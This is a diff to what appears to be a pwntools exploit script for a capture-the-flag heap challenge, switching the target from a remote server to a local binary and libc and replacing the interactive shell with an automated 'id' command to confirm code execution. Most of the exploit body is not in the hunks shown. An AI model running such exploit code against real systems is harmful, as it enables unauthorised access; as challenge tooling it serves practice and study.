@@ -10,22 +10,19 @@ import sys
 import time
 from Crypto.Cipher import AES
 
+context.arch = 'amd64'
+# context.arch = 'i386'
 # context.log_level = 'debug'
-sh = process("./task")
-# sh = remote('eonew.cn', 60107)
-elf = ELF("./task")
-libc = ELF("./libc-2.27.so")
-# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+execve_file = '/root/input_elf'
+# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+# sh = process(execve_file)
+sh = remote('127.0.0.1', 60005)
+elf = ELF(execve_file)
+# libc = ELF('./libc-2.27.so')
+libc = ELF('/root/libc.so')
 
 
 
-# Create a temporary file for GDB debugging
-try:
-    f = open('/tmp/pid', 'w')
-    f.write(str(proc.pidof(sh)[0]))
-    f.close()
-except Exception as e:
-    pass
 
 key = 'a' * 32
 iv = 'b' * 16
@@ -160,4 +157,10 @@ add(7, 1, key, iv, 0xa8, payload)
 
 time.sleep(2)
 
-sh.interactive()
+sleep(1)
+sh.sendline("id")
+sleep(1)
+print sh.recv(timeout=5)
+sleep(10)
+sh.close
+#sh.interactive()
